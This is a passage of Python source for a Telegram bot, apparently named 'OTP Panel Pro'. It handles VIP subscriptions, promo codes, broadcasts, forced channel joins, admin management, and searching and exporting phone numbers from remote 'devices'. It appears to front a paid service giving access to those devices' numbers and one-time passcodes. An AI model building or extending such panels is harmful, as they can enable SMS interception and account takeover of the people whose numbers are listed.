            await query.edit_message_text("🎟 No active promo codes left.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_sub_promos")]]))
            return

        items_per_page = 10
        promo_list = list(promo_codes.items())
        total_pages = max(1, (len(promo_list) + items_per_page - 1) // items_per_page)
        page = max(0, min(page, total_pages - 1))

        kb = []
        for c, pdata in promo_list[page * items_per_page : (page + 1) * items_per_page]:
            d = pdata.get("days", 0) if isinstance(pdata, dict) else pdata
            u = pdata.get("uses_left", 1) if isinstance(pdata, dict) else 1
            kb.append([InlineKeyboardButton(f"❌ Del {c} ({d}d | {u} left)", callback_data=f"admin_del_promo:{c}:{page}")])

        nav = []
        if page > 0:
            nav.append(InlineKeyboardButton("◀ Prev", callback_data=f"admin_list_promos:{page - 1}"))
        nav.append(InlineKeyboardButton(f"{page + 1}/{total_pages}", callback_data="noop"))
        if page < total_pages - 1:
            nav.append(InlineKeyboardButton("Next ▶", callback_data=f"admin_list_promos:{page + 1}"))

        if nav:
            kb.append(nav)
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_promos")])
        await query.edit_message_text("🎟 <b>Active Promo Codes</b>\n\nClick to delete:", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return

    if data == "admin_set_refer_time":
        pending_action[user_id] = "set_refer_time"
        await query.edit_message_text("⚙️ <b>Set Referral Reward Time</b>\n\nSend the duration in minutes awarded per referral (e.g. <code>30</code> for 30m, <code>1440</code> for 1 day):", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_promos")]]), parse_mode="HTML")
        return
    if data == "admin_set_vip_plans":
        pending_action[user_id] = "set_vip_plans"
        await query.edit_message_text("💳 <b>Set VIP Plans Text</b>\n\nSend your new pricing text below:", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_promos")]]), parse_mode="HTML")
        return

    # Comms Actions
    if data == "admin_broadcast":
        pending_action[user_id] = "admin_broadcast"
        await query.edit_message_text(
            "📣 <b>Broadcast Message</b>\n\nSend the text, photo, or video you wish to broadcast to all users:", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_comms")]]),
            parse_mode="HTML"
        )
        return
    if data == "admin_manage_channels":
        kb = [[InlineKeyboardButton("➕ Add New Channel", callback_data="admin_add_channel")]]
        for idx, ch in enumerate(force_join_channels):
            kb.append([InlineKeyboardButton(f"❌ Remove {channel_label(ch)}", callback_data=f"admin_remove_confirm:{idx}")])
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_comms")])
        await query.edit_message_text("📢 <b>Manage Required Channels</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
    if data == "admin_add_channel":
        pending_action[user_id] = "admin_add_channel_name"
        await query.edit_message_text("📝 <b>Step 1/2:</b> Send the Display Name for this channel.", parse_mode="HTML")
        return
    if data.startswith("admin_remove_confirm:"):
        idx = int(data.split(":")[1])
        if 0 <= idx < len(force_join_channels):
            removed = force_join_channels.pop(idx)
            save_data()
            await query.answer(f"Removed {channel_label(removed)}")
            kb = [[InlineKeyboardButton("➕ Add New Channel", callback_data="admin_add_channel")]]
            for i, ch in enumerate(force_join_channels):
                kb.append([InlineKeyboardButton(f"❌ Remove {channel_label(ch)}", callback_data=f"admin_remove_confirm:{i}")])
            kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_sub_comms")])
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
        return

    # System Actions
    if data == "admin_stats":
        active = sum(1 for u in all_users.values() if u.get("access_until", 0) > time.time())
        banned = sum(1 for u in all_users.values() if u.get("banned"))
        total_custom_dbs = sum(len(u.get("custom_dbs", [])) for u in all_users.values())
        await query.edit_message_text(
            f"📊 <b>Bot Statistics</b>\n━━━━━━━━━━━━━━━━━━\n"
            f"Total Registered Users: <b>{len(all_users)}</b>\n"
            f"Active VIPs: <b>{active}</b>\n"
            f"Banned Users: <b>{banned}</b>\n"
            f"User Custom Panels: <b>{total_custom_dbs}</b>\n"
            f"Required Channels: <b>{len(force_join_channels)}</b>\n"
            f"Global DBs: <b>{len(DATABASES)}</b>\n"
            f"Active Promo Codes: <b>{len(promo_codes)}</b>\n"
            f"Reward Rate: <b>+{format_duration(referral_reward_minutes)} per referral</b>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back", callback_data="admin_sub_system")]]),
            parse_mode="HTML"
        )
        return
    if data == "admin_export_nums":
        devices = [d for d in await all_devices() if d.status == "online"]
        nums = list(set([num for d in devices for num in d.numbers]))
        if not nums: return await query.answer("No online numbers found.", show_alert=True)
        filename = "Online_Numbers.txt"
        with open(filename, "w", encoding="utf-8") as f: f.write("\n".join(nums))
        await context.bot.send_document(user_id, document=open(filename, "rb"), filename=filename, caption=f"Total Active Online Numbers: {len(nums)}")
        os.remove(filename)
        return
    if data == "admin_manage_admins":
        kb = [[InlineKeyboardButton("➕ Add Admin", callback_data="admin_add_admin")], [InlineKeyboardButton("➖ Remove Admin", callback_data="admin_remove_admin")], [InlineKeyboardButton("🔙 Back", callback_data="admin_sub_system")]]
        await query.edit_message_text("👑 <b>Admin Management</b>", reply_markup=InlineKeyboardMarkup(kb), parse_mode="HTML")
        return
    if data == "admin_add_admin":
        pending_action[user_id] = "admin_add_admin_user_id"
        await query.edit_message_text("➕ Send the numeric User ID to promote:")
        return
    if data == "admin_remove_admin":
        kb = [[InlineKeyboardButton(f"❌ Remove {a}", callback_data=f"admin_del_admin:{a}")] for a in ADMIN_IDS if a != user_id]
        kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_manage_admins")])
        await query.edit_message_text("Select an admin to remove:", reply_markup=InlineKeyboardMarkup(kb))
        return
    if data.startswith("admin_del_admin:"):
        target = int(data.split(":")[1])
        if target in ADMIN_IDS and target != user_id:
            ADMIN_IDS.discard(target)
            save_data()
            await query.answer(f"Removed admin {target}", show_alert=True)
            kb = [[InlineKeyboardButton(f"❌ Remove {a}", callback_data=f"admin_del_admin:{a}")] for a in ADMIN_IDS if a != user_id]
            kb.append([InlineKeyboardButton("🔙 Back", callback_data="admin_manage_admins")])
            await query.edit_message_reply_markup(reply_markup=InlineKeyboardMarkup(kb))
        return


# ---------------------------------------------------------------------------
# Document & File Interceptor (For DB Imports)
# ---------------------------------------------------------------------------

async def on_document(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_chat.id
    if is_banned(user_id): return
    if user_id not in ADMIN_IDS: return

    action = pending_action.get(user_id)
    if action == "admin_import_db":
        pending_action.pop(user_id, None)
        doc = update.message.document
        if not doc.file_name.endswith(".json"):
            await update.message.reply_text("❌ Invalid format. Please upload a `.json` database file.", parse_mode="HTML")
            return

        file = await context.bot.get_file(doc.file_id)
        temp_path = f"{DB_FILE}.import"
        await file.download_to_drive(temp_path)
        try:
            with open(temp_path, "r", encoding="utf-8") as f:
                data = json.load(f)
            
            # Simple validation check
            if "all_users" in data and "databases" in data:
                os.replace(temp_path, DB_FILE)
                load_data() # Reload data into memory
                await update.message.reply_text("✅ <b>Database successfully imported and loaded!</b>\nAll variables have been updated.", parse_mode="HTML")
            else:
                await update.message.reply_text("❌ Import Failed: File does not appear to be a valid bot database.")
                os.remove(temp_path)
        except Exception as e:
            await update.message.reply_text(f"❌ Failed to parse or import: {e}")


# ---------------------------------------------------------------------------
# Universal Message Interceptor
# ---------------------------------------------------------------------------

async def on_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.effective_chat.id
    if is_banned(user_id): return

    text = (update.message.text or update.message.caption or "").strip()
    global referral_reward_minutes, vip_plans_text, vip_support_handle

    # Global Cancel Command
    if text.lower() == "/cancel":
        pending_action.pop(user_id, None)
        pending_data.pop(user_id, None)
        await update.message.reply_text("🚫 Action cancelled.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
        return

    action = pending_action.get(user_id)
    if not action: return

    # -- User Actions --
    if action == "user_redeem_promo":
        pending_action.pop(user_id, None)
        code = text.strip().upper()
        promo = promo_codes.get(code)
        if not promo:
            await update.message.reply_text("❌ Invalid promo code.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
            return

        redeemed_by = promo.setdefault("redeemed_by", [])
        if user_id in redeemed_by:
            await update.message.reply_text("⚠️ You have already redeemed this promo code.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
            return

        if promo.get("uses_left", 0) <= 0:
            del promo_codes[code]
            save_data()
            await update.message.reply_text("❌ This promo code has expired or reached its maximum redemption limit.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
            return

        days = promo["days"]
        promo["uses_left"] -= 1
        redeemed_by.append(user_id)

        if promo["uses_left"] <= 0:
            del promo_codes[code]

        record = user_record(user_id)
        current_time = max(time.time(), access_expiry(user_id))
        record["access_until"] = current_time + (days * 86400)
        save_data()

        await update.message.reply_text(
            f"🎉 <b>Promo Code Applied!</b>\n\nYou have successfully redeemed <b>{days} Days</b> of VIP Access.",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]),
            parse_mode="HTML"
        )
        return

    if action == "search_number":
        pending_action.pop(user_id, None)
        query_digits = re.sub(r"\D", "", text)
        if len(query_digits) < 4:
            return await update.message.reply_text("Please enter at least 4 digits.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
        matches = [d for d in await all_devices(user_id) if any(query_digits in re.sub(r"\D", "", num) for num in d.numbers)]
        if not matches:
            return await update.message.reply_text("No matching devices found.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
        rows = [[InlineKeyboardButton(f"{'🟢' if d.status == 'online' else '🔴'} {device_label(d)}", callback_data=f"device:{d.id}")] for d in matches[:25]]
        rows.append([InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")])
        await update.message.reply_text(f"🎯 Found {len(matches)} matching device(s):", reply_markup=InlineKeyboardMarkup(rows))
        return

    if action == "user_add_panel":
        pending_action.pop(user_id, None)
        if text.startswith("http"):
            record = user_record(user_id)
            if text not in record["custom_dbs"]:
                record["custom_dbs"].append(text)
                save_data()
                await update.message.reply_text("✅ Custom panel successfully saved!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Main Menu", callback_data="back_to_main")]]))
            else: await update.message.reply_text("⚠️ This panel is already in your list.")
        else: await update.message.reply_text("❌ Invalid URL. Ensure it starts with http/https.")
        return

    # -- Admin Actions --
    if user_id not in ADMIN_IDS: return

    if action == "admin_lookup_user":
        target_uid = None
        
        # Check if forwarded message
        if update.message.forward_origin:
            origin = update.message.forward_origin
            if getattr(origin, "type", "") == "user" and getattr(origin, "sender_user", None):
                target_uid = origin.sender_user.id
        
        if getattr(update.message, "forward_sender_name", None):
            await update.message.reply_text(
                "❌ This user has hidden their account ID via Telegram Privacy settings. Please search by their @username or numeric User ID instead.",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to User Management", callback_data="admin_sub_users")]])
            )
            return

        # If not forwarded, parse text
        if not target_uid and text:
            cleaned = text.lstrip("@").strip().lower()
            if text.strip().isdigit():
                target_uid = int(text.strip())
            else:
                for uid, udata in all_users.items():
                    if udata.get("username", "").lower() == cleaned:
                        target_uid = uid
                        break

        if not target_uid or target_uid not in all_users:
            await update.message.reply_text(
                "❌ User not found in database.\n(Ensure the user has started the bot at least once or verify the ID / @username).",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Back to User Management", callback_data="admin_sub_users")]])
            )
            return

        pending_action.pop(user_id, None)
        card_text, kb = render_user_lookup_card(target_uid)
        await update.message.reply_text(card_text, reply_markup=kb, parse_mode="HTML")
        return

    if action == "admin_ban_user_id":
        pending_action.pop(user_id, None)
        try:
            target = int(text)
            user_record(target)["banned"] = True
            save_data()
            await update.message.reply_text(f"✅ User <code>{target}</code> has been banned.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_users")]]), parse_mode="HTML")
        except ValueError: await update.message.reply_text("❌ Invalid User ID.")
        return

    if action == "admin_unban_user_id":
        pending_action.pop(user_id, None)
        try:
            target = int(text)
            user_record(target)["banned"] = False
            save_data()
            await update.message.reply_text(f"✅ User <code>{target}</code> has been unbanned.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_users")]]), parse_mode="HTML")
        except ValueError: await update.message.reply_text("❌ Invalid User ID.")
        return

    if action == "admin_create_promo":
        pending_action.pop(user_id, None)
        parts = text.split()
        if len(parts) >= 2 and parts[1].isdigit():
            code = parts[0].strip().upper()
            days = int(parts[1])
            limit = int(parts[2]) if len(parts) >= 3 and parts[2].isdigit() else 1
            promo_codes[code] = {"days": days, "uses_left": limit, "redeemed_by": []}
            save_data()
            await update.message.reply_text(
                f"✅ <b>Promo Code Created!</b>\n\n"
                f"<b>Code:</b> <code>{code}</code>\n"
                f"<b>Duration:</b> {days} Days VIP\n"
                f"<b>Usage Limit:</b> {limit} user(s)",
                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_promos")]]),
                parse_mode="HTML"
            )
        else:
            await update.message.reply_text("❌ Invalid format. Use: <code>CODE DAYS [USES]</code> (e.g. <code>SUMMER50 30 50</code>)", parse_mode="HTML")
        return

    if action == "admin_broadcast":
        pending_action.pop(user_id, None)
        msg_id = update.message.message_id
        
        await update.message.reply_text(
            f"📣 Broadcast processing started for {len(all_users)} users. You will be notified when finished.", 
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="menu_admin")]])
        )
        
        async def send_broadcast():
            sent = 0
            for uid in list(all_users.keys()):
                try:
                    await context.bot.copy_message(chat_id=uid, from_chat_id=user_id, message_id=msg_id)
                    sent += 1
                    await asyncio.sleep(0.05)
                except TelegramError: 
                    pass
            try: 
                await context.bot.send_message(user_id, f"✅ Broadcast complete. Successfully delivered to <b>{sent}</b> users.", parse_mode="HTML")
            except TelegramError: 
                pass
                
        asyncio.create_task(send_broadcast())
        return

    if action == "set_refer_time":
        pending_action.pop(user_id, None)
        try:
            val = int(text)
            if val <= 0: raise ValueError
            referral_reward_minutes = val
            save_data()
            await update.message.reply_text(f"✅ Reward updated: Users will now receive <b>{format_duration(referral_reward_minutes)}</b> per successful referral.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_promos")]]), parse_mode="HTML")
        except ValueError: await update.message.reply_text("❌ Invalid duration.")
        return

    if action == "set_vip_plans":
        pending_action.pop(user_id, None)
        vip_plans_text = text
        save_data()
        await update.message.reply_text(f"✅ <b>VIP Plans Updated!</b>\n━━━━━━━━━━━━━━━━━━\n{vip_plans_text}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_sub_promos")]]), parse_mode="HTML")
        return

    if action == "set_vip_support":
        pending_action.pop(user_id, None)
        new_handle = text.strip().lstrip("@")
        if not new_handle:
            await update.message.reply_text("❌ Invalid username format.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_promos")]]))
            return
        
        vip_support_handle = new_handle
        save_data()
        await update.message.reply_text(
            f"✅ <b>VIP Support Admin Updated!</b>\n\n"
            f"All VIP purchase requests will now link to: <b>@{vip_support_handle}</b>",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin Panel", callback_data="admin_sub_promos")]]),
            parse_mode="HTML"
        )
        return

    if action == "admin_grant_vip_userid":
        try:
            target_id = int(text)
            pending_data[user_id] = {"target_vip_user": target_id}
            pending_action[user_id] = "admin_grant_vip_days"
            await update.message.reply_text("How many <b>days</b> of VIP access?", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("Cancel", callback_data="admin_sub_users")]]), parse_mode="HTML")
        except ValueError: await update.message.reply_text("❌ Invalid User ID.")
        return

    if action == "admin_grant_vip_days":
        pending_action.pop(user_id, None)
        target_id = pending_data.pop(user_id, {}).get("target_vip_user")
        if not target_id: return await update.message.reply_text("❌ Target user lost.")
        try:
            days = int(text)
            if days <= 0: raise ValueError
            target_record = user_record(target_id)
            current_time = max(time.time(), access_expiry(target_id))
            target_record["access_until"] = current_time + (days * 86400)
            save_data()
            await update.message.reply_text(f"✅ Granted <b>{days} days</b> VIP to <code>{target_id}</code>.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_users")]]), parse_mode="HTML")
            try: await context.bot.send_message(target_id, f"🎉 <b>VIP Access Granted!</b>\n\nAn admin added <b>{days} days</b> to your account.", parse_mode="HTML")
            except TelegramError: pass 
        except ValueError: await update.message.reply_text("❌ Invalid number.")
        return

    if action == "admin_revoke_vip_userid":
        pending_action.pop(user_id, None)
        try:
            target_id = int(text)
            if target_id in all_users:
                record = user_record(target_id)
                record["access_until"] = 0.0
                record["trial_used"] = True 
                save_data()
                await update.message.reply_text(f"✅ Revoked VIP from <code>{target_id}</code>.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_users")]]), parse_mode="HTML")
                try: await context.bot.send_message(target_id, "🚫 <b>Access Revoked</b>\n\nYour VIP access was removed.", parse_mode="HTML")
                except TelegramError: pass
            else: await update.message.reply_text("❌ User not found.")
        except ValueError: await update.message.reply_text("❌ Invalid User ID.")
        return

    if action == "admin_add_db":
        pending_action.pop(user_id, None)
        if text.startswith("http"):
            new_tag = f"DB{len(DATABASES) + 1}"
            DATABASES[new_tag] = text
            save_data()
            await update.message.reply_text(f"✅ Added Global DB as {new_tag}", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_dbs")]]))
        else: await update.message.reply_text("❌ Invalid URL.")
        return

    if action == "admin_add_channel_name":
        pending_data[user_id] = {"display_name": text}
        pending_action[user_id] = "admin_add_channel_chatid"
        await update.message.reply_text(
            "📝 <b>Step 2/2:</b> Send the Chat ID or Username.\n\n"
            "<i>If adding a Private Channel, include the invite link separated by a space:</i>\n"
            "<code>-100123456789 https://t.me/joinchat/...</code>", 
            parse_mode="HTML"
        )
        return

    if action == "admin_add_channel_chatid":
        pending_action.pop(user_id, None)
        parts = text.split()
        chat_id_input = parts[0]
        display_name = pending_data.pop(user_id, {}).get("display_name", chat_id_input)
        
        chat_id = f"@{chat_id_input}" if not chat_id_input.startswith("@") and not chat_id_input.lstrip("-").isdigit() else chat_id_input
        
        invite_link = ""
        if len(parts) > 1 and parts[1].startswith("http"):
            invite_link = parts[1]
        elif chat_id.startswith("@"):
            invite_link = f"https://t.me/{chat_id.lstrip('@')}"
            
        force_join_channels.append({"chat_id": chat_id, "invite_link": invite_link, "display_name": display_name})
        save_data()
        await update.message.reply_text(f"✅ Required Channel <b>{html_escape(display_name)}</b> added!", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_comms")]]), parse_mode="HTML")
        return

    if action == "admin_add_admin_user_id":
        pending_action.pop(user_id, None)
        try:
            target = int(text)
            ADMIN_IDS.add(target)
            save_data()
            await update.message.reply_text(f"✅ User ID <code>{target}</code> is now an Admin.", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🔙 Admin", callback_data="admin_sub_system")]]), parse_mode="HTML")
        except ValueError: await update.message.reply_text("❌ Invalid user ID.")
        return


# ---------------------------------------------------------------------------
# Background Initialization & Entrypoint
# ---------------------------------------------------------------------------

_background_tasks: set[asyncio.Task] = set()

async def post_init(application: Application) -> None:
    global _main_app
    _main_app = application
    for coro in (device_poll_loop(), autosave_loop(), auto_prune_database()):
        task = asyncio.create_task(coro)
        _background_tasks.add(task)
        task.add_done_callback(_background_tasks.discard)

async def post_shutdown(application: Application) -> None:
    global http_session
    for task in list(_background_tasks):
        task.cancel()
    if _background_tasks:
        await asyncio.gather(*_background_tasks, return_exceptions=True)
    _background_tasks.clear()
    if http_session is not None and not http_session.closed:
        await http_session.close()
        http_session = None
    save_data()


def main() -> None:
    if not BOT_TOKEN or BOT_TOKEN == "YOUR_BOT_TOKEN_HERE":
        raise RuntimeError("BOT_TOKEN is missing! Set it as an environment variable or edit the script.")

    load_data()
    application = (
        Application.builder()
        .token(BOT_TOKEN)
        .post_init(post_init)
        .post_shutdown(post_shutdown)
        .build()
    )

    application.add_handler(CommandHandler("start", cmd_start))
    application.add_handler(CommandHandler("referral", cmd_referral))
    application.add_handler(CommandHandler("revoke", cmd_revoke))
    application.add_handler(ChatMemberHandler(on_channel_leave, ChatMemberHandler.CHAT_MEMBER))
    application.add_handler(CallbackQueryHandler(on_callback))
    application.add_handler(MessageHandler(filters.Document.FileExtension("json") & ~filters.COMMAND, on_document))
    application.add_handler(MessageHandler((filters.ALL) & ~filters.COMMAND, on_text))

    log("OTP Panel Pro is running...")
    application.run_polling(drop_pending_updates=True, allowed_updates=Update.ALL_TYPES)


if __name__ == "__main__":
    main()
